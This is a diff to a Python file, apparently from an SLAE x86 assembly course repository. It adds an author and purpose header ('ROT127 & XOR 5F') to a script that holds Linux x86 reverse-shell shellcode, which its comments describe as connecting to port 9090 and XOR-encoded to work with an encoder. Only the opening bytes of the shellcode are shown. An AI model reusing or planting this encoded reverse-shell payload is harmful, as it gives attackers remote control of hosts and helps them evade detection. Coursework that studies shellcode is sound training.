@@ -1,6 +1,15 @@
 #!/usr/bin/python
-		# TCP reverse shell 9090 127.255.255.254
-		# xor added to work with encoder
+#
+# Linux x86
+# Author:  thryb
+# Date:    22-08-16
+# Purpose: ROT127 & XOR 5F
+# ID:      SLAE-770
+# Git:     https://www.github.com/thryb/SLAE-770
+#
+
+	    # TCP reverse shell 9090 127.255.255.254
+	    # xor added to work with encoder
 shellcode = ("\x32\xd2\x31\xf6\x31\xff" \
 	    "\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x96\xb0\x66" \
 	    "\x83\xc3\x02\x68\x7f\xff\xff\xef\x66\x68\x23\x82\x66\x6a\x02\x89\xe1\x6a\x10\x51" \
